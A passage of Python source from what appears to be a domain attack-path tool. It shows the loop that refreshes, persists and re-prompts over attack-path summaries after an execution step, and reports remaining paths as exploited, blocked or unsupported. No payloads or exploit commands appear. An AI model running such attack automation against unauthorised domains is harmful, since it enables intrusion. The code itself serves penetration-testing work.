                    f"(affected principals={affected_count}, threshold={_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD}). "
                    "All attack steps are already persisted; only the live list refresh is deferred. "
                    "Run `attack_paths <domain> owned` when you want a fresh recomputation."
                )
                print_info_debug(
                    "[attack_paths] auto-refresh skipped after execution: "
                    f"domain={marked_domain} affected_users={affected_count} "
                    f"threshold={_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD}"
                )
                return True
            print_info_verbose(
                "Refreshing attack-path summaries after execution "
                "(this can take longer on large domains)."
            )
            summaries = _refresh_summaries()
            if show_sections:
                summaries = _sort_target_priority_groups(summaries)
            persist_attack_path_snapshot(
                shell,
                domain,
                summaries=summaries,
                scope=snapshot_scope,
                target=snapshot_target,
                target_mode=snapshot_target_mode,
                search_mode_label=search_mode_label,
            )
            if (
                non_interactive
                and auto_continue_theoretical_in_non_interactive
                and not any(
                    _is_theoretical_status(summary.get("status"))
                    and _status_allowed_by_filter(
                        str(summary.get("status") or "theoretical").strip().lower(),
                        desired_statuses_set,
                    )
                    for summary in summaries
                )
            ):
                print_info_debug(
                    "[attack_paths] auto-continue converged: "
                    f"domain={marked_domain} no theoretical summaries remain"
                )
                return True
            actionable_paths = [
                summary
                for summary in summaries
                if _path_is_actionable_for_execution_prompt(
                    summary, desired_statuses=desired_statuses_set
                )
            ]
            if actionable_paths:
                print_info_debug(
                    "[attack_paths] re-prompting after execution: "
                    f"domain={marked_domain} remaining={len(summaries)} actionable={len(actionable_paths)}"
                )
                print_attack_paths_summary(
                    domain,
                    summaries,
                    max_display=min(max_display, len(summaries)),
                    search_mode_label=search_mode_label,
                    actionable_count=len(actionable_paths),
                    show_sections=show_sections,
                )
                continue
            if summaries:
                non_actionable_total, reasons = _summarize_non_actionable_paths(
                    summaries,
                    desired_statuses=desired_statuses_set,
                )
                reason_summary = _format_non_actionable_reason_summary(reasons)
                if reasons["exploited"] == non_actionable_total and non_actionable_total > 0:
                    print_info(
                        "Execution completed. No further actionable attack paths remain "
                        "because the remaining paths are already exploited."
                    )
                else:
                    print_info(
                        "Execution completed. No further actionable attack paths remain. "
                        "Any remaining paths are already exploited, blocked, unsupported, "
                        "or missing execution context."
                    )
                print_info(f"Remaining path summary: {reason_summary}")
                print_info_debug(
                    "[attack_paths] stopping after execution: "
                    f"domain={marked_domain} reason=no_actionable_paths "
                    f"remaining={non_actionable_total} exploited={reasons['exploited']} "
                    f"blocked={reasons['blocked']} unsupported={reasons['unsupported']} "
                    f"unavailable={reasons['unavailable']} needs_context={reasons['needs_context']} "
                    f"filtered={reasons['status_filtered']} other={reasons['other']}"
                )
                return True
            print_info_debug(
                f"[attack_paths] stopping after execution: domain={marked_domain} reason=no_remaining_paths"
            )
            return True

        # `execute_selected_attack_path` already printed a user-facing error/warning.
        # Keep the selection loop open so the user can try another path.
        print_info_debug(
            f"[attack_paths] re-prompting after failed attempt: domain={marked_domain}"
        )
        if single_pass:
            return executed
        continue

    return executed
